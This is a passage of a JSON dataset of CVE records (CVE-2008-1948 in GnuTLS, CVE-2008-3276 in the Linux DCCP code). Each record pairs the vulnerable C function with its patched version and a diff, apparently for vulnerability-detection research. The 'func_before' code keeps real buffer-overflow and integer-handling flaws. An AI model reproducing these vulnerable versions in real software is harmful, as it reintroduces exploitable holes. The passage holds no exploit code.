        "func": "int\n_gnutls_server_name_recv_params (gnutls_session_t session,\n\t\t\t\t const opaque * data, size_t _data_size)\n{\n  int i;\n  const unsigned char *p;\n  uint16_t len, type;\n  ssize_t data_size = _data_size;\n  int server_names = 0;\n\n  if (session->security_parameters.entity == GNUTLS_SERVER)\n    {\n      DECR_LENGTH_RET (data_size, 2, 0);\n      len = _gnutls_read_uint16 (data);\n\n      if (len != data_size)\n\t{\n\t  /* This is unexpected packet length, but\n\t   * just ignore it, for now.\n\t   */\n\t  gnutls_assert ();\n\t  return 0;\n\t}\n\n      p = data + 2;\n\n      /* Count all server_names in the packet. */\n      while (data_size > 0)\n\t{\n\t  DECR_LENGTH_RET (data_size, 1, 0);\n\t  p++;\n\n\t  DECR_LEN (data_size, 2);\n\t  len = _gnutls_read_uint16 (p);\n\t  p += 2;\n\n\t  if (len > 0)\n\t    {\n\t      DECR_LENGTH_RET (data_size, len, 0);\n\t      server_names++;\n\t      p += len;\n\t    }\n\t  else\n\t    _gnutls_handshake_log\n\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",\n\t       session);\n\n\t}\n\n      /* we cannot accept more server names.\n       */\n      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n\t{\n\t  _gnutls_handshake_log\n\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",\n\t     session);\n\t  server_names = MAX_SERVER_NAME_EXTENSIONS;\n\t}\n\n      session->security_parameters.extensions.server_names_size =\n\tserver_names;\n      if (server_names == 0)\n\treturn 0;\t\t/* no names found */\n\n\n      p = data + 2;\n      for (i = 0; i < server_names; i++)\n\t{\n\t  type = *p;\n\t  p++;\n\n\t  len = _gnutls_read_uint16 (p);\n\t  p += 2;\n\n\t  switch (type)\n\t    {\n\t    case 0:\t\t/* NAME_DNS */\n\t      if (len <= MAX_SERVER_NAME_SIZE)\n\t\t{\n\t\t  memcpy (session->security_parameters.extensions.\n\t\t\t  server_names[i].name, p, len);\n\t\t  session->security_parameters.extensions.\n\t\t    server_names[i].name_length = len;\n\t\t  session->security_parameters.extensions.\n\t\t    server_names[i].type = GNUTLS_NAME_DNS;\n\t\t  break;\n\t\t}\n\t    }\n\n\t  /* move to next record */\n\t  p += len;\n\t}\n    }\n  return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -34,10 +34,27 @@\n \t  len = _gnutls_read_uint16 (p);\n \t  p += 2;\n \n-\t  DECR_LENGTH_RET (data_size, len, 0);\n-\t  server_names++;\n+\t  if (len > 0)\n+\t    {\n+\t      DECR_LENGTH_RET (data_size, len, 0);\n+\t      server_names++;\n+\t      p += len;\n+\t    }\n+\t  else\n+\t    _gnutls_handshake_log\n+\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",\n+\t       session);\n \n-\t  p += len;\n+\t}\n+\n+      /* we cannot accept more server names.\n+       */\n+      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n+\t{\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",\n+\t     session);\n+\t  server_names = MAX_SERVER_NAME_EXTENSIONS;\n \t}\n \n       session->security_parameters.extensions.server_names_size =\n@@ -45,10 +62,6 @@\n       if (server_names == 0)\n \treturn 0;\t\t/* no names found */\n \n-      /* we cannot accept more server names.\n-       */\n-      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n-\tserver_names = MAX_SERVER_NAME_EXTENSIONS;\n \n       p = data + 2;\n       for (i = 0; i < server_names; i++)",
        "diff_line_info": {
            "deleted_lines": [
                "\t  DECR_LENGTH_RET (data_size, len, 0);",
                "\t  server_names++;",
                "\t  p += len;",
                "      /* we cannot accept more server names.",
                "       */",
                "      if (server_names > MAX_SERVER_NAME_EXTENSIONS)",
                "\tserver_names = MAX_SERVER_NAME_EXTENSIONS;"
            ],
            "added_lines": [
                "\t  if (len > 0)",
                "\t    {",
                "\t      DECR_LENGTH_RET (data_size, len, 0);",
                "\t      server_names++;",
                "\t      p += len;",
                "\t    }",
                "\t  else",
                "\t    _gnutls_handshake_log",
                "\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",",
                "\t       session);",
                "\t}",
                "",
                "      /* we cannot accept more server names.",
                "       */",
                "      if (server_names > MAX_SERVER_NAME_EXTENSIONS)",
                "\t{",
                "\t  _gnutls_handshake_log",
                "\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",",
                "\t     session);",
                "\t  server_names = MAX_SERVER_NAME_EXTENSIONS;"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-1948",
        "func_name": "gnutls/_gnutls_ciphertext2compressed",
        "description": "The _gnutls_server_name_recv_params function in lib/ext_server_name.c in libgnutls in gnutls-serv in GnuTLS before 2.2.4 does not properly calculate the number of Server Names in a TLS 1.0 Client Hello message during extension handling, which allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a zero value for the length of Server Names, which leads to a buffer overflow in session resumption data in the pack_security_parameters function, aka GNUTLS-SA-2008-1-1.",
        "git_url": "http://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commit;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b",
        "commit_title": "",
        "commit_text": "Fix GNUTLS-SA-2008-1 security vulnerabilities. See http://www.gnu.org/software/gnutls/security.html for updates. ",
        "func_before": "int\n_gnutls_ciphertext2compressed (gnutls_session_t session,\n\t\t\t       opaque * compress_data,\n\t\t\t       int compress_size,\n\t\t\t       gnutls_datum_t ciphertext, uint8_t type)\n{\n  uint8_t MAC[MAX_HASH_SIZE];\n  uint16_t c_length;\n  uint8_t pad;\n  int length;\n  digest_hd_st td;\n  uint16_t blocksize;\n  int ret, i, pad_failed = 0;\n  uint8_t major, minor;\n  gnutls_protocol_t ver;\n  int hash_size =\n    _gnutls_hash_get_algo_len (session->security_parameters.\n\t\t\t       read_mac_algorithm);\n\n  ver = gnutls_protocol_get_version (session);\n  minor = _gnutls_version_get_minor (ver);\n  major = _gnutls_version_get_major (ver);\n\n  blocksize = _gnutls_cipher_get_block_size (session->security_parameters.\n\t\t\t\t\t     read_bulk_cipher_algorithm);\n\n  /* initialize MAC \n   */\n  ret = mac_init (&td, session->security_parameters.read_mac_algorithm,\n\t\t session->connection_state.read_mac_secret.data,\n\t\t session->connection_state.read_mac_secret.size, ver);\n\n  if (ret < 0\n      && session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n\n  /* actual decryption (inplace)\n   */\n  switch (_gnutls_cipher_is_block\n\t  (session->security_parameters.read_bulk_cipher_algorithm))\n    {\n    case CIPHER_STREAM:\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      length = ciphertext.size - hash_size;\n\n      break;\n    case CIPHER_BLOCK:\n      if ((ciphertext.size < blocksize) || (ciphertext.size % blocksize != 0))\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* ignore the IV in TLS 1.1.\n       */\n      if (session->security_parameters.version >= GNUTLS_TLS1_1)\n\t{\n\t  ciphertext.size -= blocksize;\n\t  ciphertext.data += blocksize;\n\n\t  if (ciphertext.size == 0)\n\t    {\n\t      gnutls_assert ();\n\t      return GNUTLS_E_DECRYPTION_FAILED;\n\t    }\n\t}\n\n      pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n\n      length = ciphertext.size - hash_size - pad;\n\n      if (pad > ciphertext.size - hash_size)\n\t{\n\t  gnutls_assert ();\n\t  /* We do not fail here. We check below for the\n\t   * the pad_failed. If zero means success.\n\t   */\n\t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      /* Check the pading bytes (TLS 1.x)\n       */\n      if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n\tfor (i = 2; i < pad; i++)\n\t  {\n\t    if (ciphertext.data[ciphertext.size - i] !=\n\t\tciphertext.data[ciphertext.size - 1])\n\t      pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n\t  }\n      break;\n    default:\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (length < 0)\n    length = 0;\n  c_length = _gnutls_conv_uint16 ((uint16_t) length);\n\n  /* Pass the type, version, length and compressed through\n   * MAC.\n   */\n  if (session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      _gnutls_hmac (&td,\n\t\t    UINT64DATA (session->connection_state.\n\t\t\t\tread_sequence_number), 8);\n\n      _gnutls_hmac (&td, &type, 1);\n      if (ver >= GNUTLS_TLS1)\n\t{\t\t\t/* TLS 1.x */\n\t  _gnutls_hmac (&td, &major, 1);\n\t  _gnutls_hmac (&td, &minor, 1);\n\t}\n      _gnutls_hmac (&td, &c_length, 2);\n\n      if (length > 0)\n\t_gnutls_hmac (&td, ciphertext.data, length);\n\n      mac_deinit (&td, MAC, ver);\n    }\n\n  /* This one was introduced to avoid a timing attack against the TLS\n   * 1.0 protocol.\n   */\n  if (pad_failed != 0)\n    return pad_failed;\n\n  /* HMAC was not the same. \n   */\n  if (memcmp (MAC, &ciphertext.data[length], hash_size) != 0)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* copy the decrypted stuff to compress_data.\n   */\n  if (compress_size < length)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECOMPRESSION_FAILED;\n    }\n  memcpy (compress_data, ciphertext.data, length);\n\n  return length;\n}",
        "func": "int\n_gnutls_ciphertext2compressed (gnutls_session_t session,\n\t\t\t       opaque * compress_data,\n\t\t\t       int compress_size,\n\t\t\t       gnutls_datum_t ciphertext, uint8_t type)\n{\n  uint8_t MAC[MAX_HASH_SIZE];\n  uint16_t c_length;\n  uint8_t pad;\n  int length;\n  digest_hd_st td;\n  uint16_t blocksize;\n  int ret, i, pad_failed = 0;\n  uint8_t major, minor;\n  gnutls_protocol_t ver;\n  int hash_size =\n    _gnutls_hash_get_algo_len (session->security_parameters.\n\t\t\t       read_mac_algorithm);\n\n  ver = gnutls_protocol_get_version (session);\n  minor = _gnutls_version_get_minor (ver);\n  major = _gnutls_version_get_major (ver);\n\n  blocksize = _gnutls_cipher_get_block_size (session->security_parameters.\n\t\t\t\t\t     read_bulk_cipher_algorithm);\n\n  /* initialize MAC \n   */\n  ret = mac_init (&td, session->security_parameters.read_mac_algorithm,\n\t\t session->connection_state.read_mac_secret.data,\n\t\t session->connection_state.read_mac_secret.size, ver);\n\n  if (ret < 0\n      && session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (ciphertext.size < (unsigned) blocksize + hash_size)\n    {\n      _gnutls_record_log\n\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n\t session, ciphertext.size, blocksize, hash_size);\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* actual decryption (inplace)\n   */\n  switch (_gnutls_cipher_is_block\n\t  (session->security_parameters.read_bulk_cipher_algorithm))\n    {\n    case CIPHER_STREAM:\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      length = ciphertext.size - hash_size;\n\n      break;\n    case CIPHER_BLOCK:\n      if ((ciphertext.size < blocksize) || (ciphertext.size % blocksize != 0))\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* ignore the IV in TLS 1.1.\n       */\n      if (session->security_parameters.version >= GNUTLS_TLS1_1)\n\t{\n\t  ciphertext.size -= blocksize;\n\t  ciphertext.data += blocksize;\n\n\t  if (ciphertext.size == 0)\n\t    {\n\t      gnutls_assert ();\n\t      return GNUTLS_E_DECRYPTION_FAILED;\n\t    }\n\t}\n\n      pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n\n      if ((int)pad > (int)ciphertext.size - hash_size)\n\t{\n\t  gnutls_assert ();\n\t  /* We do not fail here. We check below for the\n\t   * the pad_failed. If zero means success.\n\t   */\n\t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      length = ciphertext.size - hash_size - pad;\n\n      /* Check the pading bytes (TLS 1.x)\n       */\n      if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n\tfor (i = 2; i < pad; i++)\n\t  {\n\t    if (ciphertext.data[ciphertext.size - i] !=\n\t\tciphertext.data[ciphertext.size - 1])\n\t      pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n\t  }\n      break;\n    default:\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (length < 0)\n    length = 0;\n  c_length = _gnutls_conv_uint16 ((uint16_t) length);\n\n  /* Pass the type, version, length and compressed through\n   * MAC.\n   */\n  if (session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      _gnutls_hmac (&td,\n\t\t    UINT64DATA (session->connection_state.\n\t\t\t\tread_sequence_number), 8);\n\n      _gnutls_hmac (&td, &type, 1);\n      if (ver >= GNUTLS_TLS1)\n\t{\t\t\t/* TLS 1.x */\n\t  _gnutls_hmac (&td, &major, 1);\n\t  _gnutls_hmac (&td, &minor, 1);\n\t}\n      _gnutls_hmac (&td, &c_length, 2);\n\n      if (length > 0)\n\t_gnutls_hmac (&td, ciphertext.data, length);\n\n      mac_deinit (&td, MAC, ver);\n    }\n\n  /* This one was introduced to avoid a timing attack against the TLS\n   * 1.0 protocol.\n   */\n  if (pad_failed != 0)\n    return pad_failed;\n\n  /* HMAC was not the same. \n   */\n  if (memcmp (MAC, &ciphertext.data[length], hash_size) != 0)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* copy the decrypted stuff to compress_data.\n   */\n  if (compress_size < length)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECOMPRESSION_FAILED;\n    }\n  memcpy (compress_data, ciphertext.data, length);\n\n  return length;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -37,6 +37,14 @@\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n+  if (ciphertext.size < (unsigned) blocksize + hash_size)\n+    {\n+      _gnutls_record_log\n+\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n+\t session, ciphertext.size, blocksize, hash_size);\n+      gnutls_assert ();\n+      return GNUTLS_E_DECRYPTION_FAILED;\n+    }\n \n   /* actual decryption (inplace)\n    */\n@@ -88,9 +96,7 @@\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n \n-      length = ciphertext.size - hash_size - pad;\n-\n-      if (pad > ciphertext.size - hash_size)\n+      if ((int)pad > (int)ciphertext.size - hash_size)\n \t{\n \t  gnutls_assert ();\n \t  /* We do not fail here. We check below for the\n@@ -98,6 +104,8 @@\n \t   */\n \t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n \t}\n+\n+      length = ciphertext.size - hash_size - pad;\n \n       /* Check the pading bytes (TLS 1.x)\n        */",
        "diff_line_info": {
            "deleted_lines": [
                "      length = ciphertext.size - hash_size - pad;",
                "",
                "      if (pad > ciphertext.size - hash_size)"
            ],
            "added_lines": [
                "  if (ciphertext.size < (unsigned) blocksize + hash_size)",
                "    {",
                "      _gnutls_record_log",
                "\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",",
                "\t session, ciphertext.size, blocksize, hash_size);",
                "      gnutls_assert ();",
                "      return GNUTLS_E_DECRYPTION_FAILED;",
                "    }",
                "      if ((int)pad > (int)ciphertext.size - hash_size)",
                "",
                "      length = ciphertext.size - hash_size - pad;"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-1948",
        "func_name": "gnutls/_gnutls_recv_handshake_header",
        "description": "The _gnutls_server_name_recv_params function in lib/ext_server_name.c in libgnutls in gnutls-serv in GnuTLS before 2.2.4 does not properly calculate the number of Server Names in a TLS 1.0 Client Hello message during extension handling, which allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a zero value for the length of Server Names, which leads to a buffer overflow in session resumption data in the pack_security_parameters function, aka GNUTLS-SA-2008-1-1.",
        "git_url": "http://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commit;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b",
        "commit_title": "",
        "commit_text": "Fix GNUTLS-SA-2008-1 security vulnerabilities. See http://www.gnu.org/software/gnutls/security.html for updates. ",
        "func_before": "static int\n_gnutls_recv_handshake_header (gnutls_session_t session,\n\t\t\t       gnutls_handshake_description_t type,\n\t\t\t       gnutls_handshake_description_t * recv_type)\n{\n  int ret;\n  uint32_t length32 = 0;\n  uint8_t *dataptr = NULL;\t/* for realloc */\n  size_t handshake_header_size = HANDSHAKE_HEADER_SIZE;\n\n  /* if we have data into the buffer then return them, do not read the next packet.\n   * In order to return we need a full TLS handshake header, or in case of a version 2\n   * packet, then we return the first byte.\n   */\n  if (session->internals.handshake_header_buffer.header_size ==\n      handshake_header_size || (session->internals.v2_hello != 0\n\t\t\t\t&& type == GNUTLS_HANDSHAKE_CLIENT_HELLO\n\t\t\t\t&& session->internals.\n\t\t\t\thandshake_header_buffer.packet_length > 0))\n    {\n\n      *recv_type = session->internals.handshake_header_buffer.recv_type;\n\n      return session->internals.handshake_header_buffer.packet_length;\n    }\n\n  /* Note: SSL2_HEADERS == 1 */\n\n  dataptr = session->internals.handshake_header_buffer.header;\n\n  /* If we haven't already read the handshake headers.\n   */\n  if (session->internals.handshake_header_buffer.header_size < SSL2_HEADERS)\n    {\n      ret =\n\t_gnutls_handshake_io_recv_int (session, GNUTLS_HANDSHAKE,\n\t\t\t\t       type, dataptr, SSL2_HEADERS);\n\n      if (ret < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* The case ret==0 is caught here.\n       */\n      if (ret != SSL2_HEADERS)\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      session->internals.handshake_header_buffer.header_size = SSL2_HEADERS;\n    }\n\n  if (session->internals.v2_hello == 0\n      || type != GNUTLS_HANDSHAKE_CLIENT_HELLO)\n    {\n      ret =\n\t_gnutls_handshake_io_recv_int (session, GNUTLS_HANDSHAKE,\n\t\t\t\t       type,\n\t\t\t\t       &dataptr[session->\n\t\t\t\t\t\tinternals.\n\t\t\t\t\t\thandshake_header_buffer.\n\t\t\t\t\t\theader_size],\n\t\t\t\t       HANDSHAKE_HEADER_SIZE -\n\t\t\t\t       session->internals.\n\t\t\t\t       handshake_header_buffer.header_size);\n      if (ret <= 0)\n\t{\n\t  gnutls_assert ();\n\t  return (ret < 0) ? ret : GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      if ((size_t) ret !=\n\t  HANDSHAKE_HEADER_SIZE -\n\t  session->internals.handshake_header_buffer.header_size)\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      *recv_type = dataptr[0];\n\n      /* we do not use DECR_LEN because we know\n       * that the packet has enough data.\n       */\n      length32 = _gnutls_read_uint24 (&dataptr[1]);\n      handshake_header_size = HANDSHAKE_HEADER_SIZE;\n\n      _gnutls_handshake_log (\"HSK[%x]: %s was received [%ld bytes]\\n\",\n\t\t\t     session, _gnutls_handshake2str (dataptr[0]),\n\t\t\t     length32 + HANDSHAKE_HEADER_SIZE);\n\n    }\n  else\n    {\t\t\t\t/* v2 hello */\n      length32 = session->internals.v2_hello - SSL2_HEADERS;\t/* we've read the first byte */\n\n      handshake_header_size = SSL2_HEADERS;\t/* we've already read one byte */\n\n      *recv_type = dataptr[0];\n\n      _gnutls_handshake_log (\"HSK[%x]: %s(v2) was received [%ld bytes]\\n\",\n\t\t\t     session, _gnutls_handshake2str (*recv_type),\n\t\t\t     length32 + handshake_header_size);\n\n      if (*recv_type != GNUTLS_HANDSHAKE_CLIENT_HELLO)\n\t{\t\t\t/* it should be one or nothing */\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n\t}\n    }\n\n  /* put the packet into the buffer */\n  session->internals.handshake_header_buffer.header_size =\n    handshake_header_size;\n  session->internals.handshake_header_buffer.packet_length = length32;\n  session->internals.handshake_header_buffer.recv_type = *recv_type;\n\n  if (*recv_type != type)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n    }\n\n  return length32;\n}",
        "func": "static int\n_gnutls_recv_handshake_header (gnutls_session_t session,\n\t\t\t       gnutls_handshake_description_t type,\n\t\t\t       gnutls_handshake_description_t * recv_type)\n{\n  int ret;\n  uint32_t length32 = 0;\n  uint8_t *dataptr = NULL;\t/* for realloc */\n  size_t handshake_header_size = HANDSHAKE_HEADER_SIZE;\n\n  /* if we have data into the buffer then return them, do not read the next packet.\n   * In order to return we need a full TLS handshake header, or in case of a version 2\n   * packet, then we return the first byte.\n   */\n  if (session->internals.handshake_header_buffer.header_size ==\n      handshake_header_size || (session->internals.v2_hello != 0\n\t\t\t\t&& type == GNUTLS_HANDSHAKE_CLIENT_HELLO\n\t\t\t\t&& session->internals.\n\t\t\t\thandshake_header_buffer.packet_length > 0))\n    {\n\n      *recv_type = session->internals.handshake_header_buffer.recv_type;\n\n      if (*recv_type != type)\n\t{\n\t  gnutls_assert ();\n\t  _gnutls_handshake_log\n\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);\n\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n\t}\n\n      return session->internals.handshake_header_buffer.packet_length;\n    }\n\n  /* Note: SSL2_HEADERS == 1 */\n\n  dataptr = session->internals.handshake_header_buffer.header;\n\n  /* If we haven't already read the handshake headers.\n   */\n  if (session->internals.handshake_header_buffer.header_size < SSL2_HEADERS)\n    {\n      ret =\n\t_gnutls_handshake_io_recv_int (session, GNUTLS_HANDSHAKE,\n\t\t\t\t       type, dataptr, SSL2_HEADERS);\n\n      if (ret < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* The case ret==0 is caught here.\n       */\n      if (ret != SSL2_HEADERS)\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      session->internals.handshake_header_buffer.header_size = SSL2_HEADERS;\n    }\n\n  if (session->internals.v2_hello == 0\n      || type != GNUTLS_HANDSHAKE_CLIENT_HELLO)\n    {\n      ret =\n\t_gnutls_handshake_io_recv_int (session, GNUTLS_HANDSHAKE,\n\t\t\t\t       type,\n\t\t\t\t       &dataptr[session->\n\t\t\t\t\t\tinternals.\n\t\t\t\t\t\thandshake_header_buffer.\n\t\t\t\t\t\theader_size],\n\t\t\t\t       HANDSHAKE_HEADER_SIZE -\n\t\t\t\t       session->internals.\n\t\t\t\t       handshake_header_buffer.header_size);\n      if (ret <= 0)\n\t{\n\t  gnutls_assert ();\n\t  return (ret < 0) ? ret : GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      if ((size_t) ret !=\n\t  HANDSHAKE_HEADER_SIZE -\n\t  session->internals.handshake_header_buffer.header_size)\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_PACKET_LENGTH;\n\t}\n      *recv_type = dataptr[0];\n\n      /* we do not use DECR_LEN because we know\n       * that the packet has enough data.\n       */\n      length32 = _gnutls_read_uint24 (&dataptr[1]);\n      handshake_header_size = HANDSHAKE_HEADER_SIZE;\n\n      _gnutls_handshake_log (\"HSK[%x]: %s was received [%ld bytes]\\n\",\n\t\t\t     session, _gnutls_handshake2str (dataptr[0]),\n\t\t\t     length32 + HANDSHAKE_HEADER_SIZE);\n\n    }\n  else\n    {\t\t\t\t/* v2 hello */\n      length32 = session->internals.v2_hello - SSL2_HEADERS;\t/* we've read the first byte */\n\n      handshake_header_size = SSL2_HEADERS;\t/* we've already read one byte */\n\n      *recv_type = dataptr[0];\n\n      _gnutls_handshake_log (\"HSK[%x]: %s(v2) was received [%ld bytes]\\n\",\n\t\t\t     session, _gnutls_handshake2str (*recv_type),\n\t\t\t     length32 + handshake_header_size);\n\n      if (*recv_type != GNUTLS_HANDSHAKE_CLIENT_HELLO)\n\t{\t\t\t/* it should be one or nothing */\n\t  gnutls_assert ();\n\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n\t}\n    }\n\n  /* put the packet into the buffer */\n  session->internals.handshake_header_buffer.header_size =\n    handshake_header_size;\n  session->internals.handshake_header_buffer.packet_length = length32;\n  session->internals.handshake_header_buffer.recv_type = *recv_type;\n\n  if (*recv_type != type)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n    }\n\n  return length32;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,6 +20,14 @@\n     {\n \n       *recv_type = session->internals.handshake_header_buffer.recv_type;\n+\n+      if (*recv_type != type)\n+\t{\n+\t  gnutls_assert ();\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);\n+\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n+\t}\n \n       return session->internals.handshake_header_buffer.packet_length;\n     }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "      if (*recv_type != type)",
                "\t{",
                "\t  gnutls_assert ();",
                "\t  _gnutls_handshake_log",
                "\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);",
                "\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-3276",
        "func_name": "torvalds/linux/dccp_setsockopt_change",
        "description": "Integer overflow in the dccp_setsockopt_change function in net/dccp/proto.c in the Datagram Congestion Control Protocol (DCCP) subsystem in the Linux kernel 2.6.17-rc1 through 2.6.26.2 allows remote attackers to cause a denial of service (panic) via a crafted integer value, related to Change L and Change R options without at least one byte in the dccpsf_val field.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/stable/linux.git;a=commit;h=3e8a0a559c66ee9e7468195691a56fefc3589740",
        "commit_title": "    ",
        "commit_text": "Thanks to Eugene Teo for reporting this problem.      ",
        "func_before": "static int dccp_setsockopt_change(struct sock *sk, int type,\n\t\t\t\t  struct dccp_so_feat __user *optval)\n{\n\tstruct dccp_so_feat opt;\n\tu8 *val;\n\tint rc;\n\n\tif (copy_from_user(&opt, optval, sizeof(opt)))\n\t\treturn -EFAULT;\n\n\tval = kmalloc(opt.dccpsf_len, GFP_KERNEL);\n\tif (!val)\n\t\treturn -ENOMEM;\n\n\tif (copy_from_user(val, opt.dccpsf_val, opt.dccpsf_len)) {\n\t\trc = -EFAULT;\n\t\tgoto out_free_val;\n\t}\n\n\trc = dccp_feat_change(dccp_msk(sk), type, opt.dccpsf_feat,\n\t\t\t      val, opt.dccpsf_len, GFP_KERNEL);\n\tif (rc)\n\t\tgoto out_free_val;\n\nout:\n\treturn rc;\n\nout_free_val:\n\tkfree(val);\n\tgoto out;\n}",
        "func": "static int dccp_setsockopt_change(struct sock *sk, int type,\n\t\t\t\t  struct dccp_so_feat __user *optval)\n{\n\tstruct dccp_so_feat opt;\n\tu8 *val;\n\tint rc;\n\n\tif (copy_from_user(&opt, optval, sizeof(opt)))\n\t\treturn -EFAULT;\n\t/*\n\t * rfc4340: 6.1. Change Options\n\t */\n\tif (opt.dccpsf_len < 1)\n\t\treturn -EINVAL;\n\n\tval = kmalloc(opt.dccpsf_len, GFP_KERNEL);\n\tif (!val)\n\t\treturn -ENOMEM;\n\n\tif (copy_from_user(val, opt.dccpsf_val, opt.dccpsf_len)) {\n\t\trc = -EFAULT;\n\t\tgoto out_free_val;\n\t}\n\n\trc = dccp_feat_change(dccp_msk(sk), type, opt.dccpsf_feat,\n\t\t\t      val, opt.dccpsf_len, GFP_KERNEL);\n\tif (rc)\n\t\tgoto out_free_val;\n\nout:\n\treturn rc;\n\nout_free_val:\n\tkfree(val);\n\tgoto out;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,6 +7,11 @@\n \n \tif (copy_from_user(&opt, optval, sizeof(opt)))\n \t\treturn -EFAULT;\n+\t/*\n+\t * rfc4340: 6.1. Change Options\n+\t */\n+\tif (opt.dccpsf_len < 1)\n+\t\treturn -EINVAL;\n \n \tval = kmalloc(opt.dccpsf_len, GFP_KERNEL);\n \tif (!val)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t/*",
                "\t * rfc4340: 6.1. Change Options",
                "\t */",
                "\tif (opt.dccpsf_len < 1)",
                "\t\treturn -EINVAL;"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-3526",
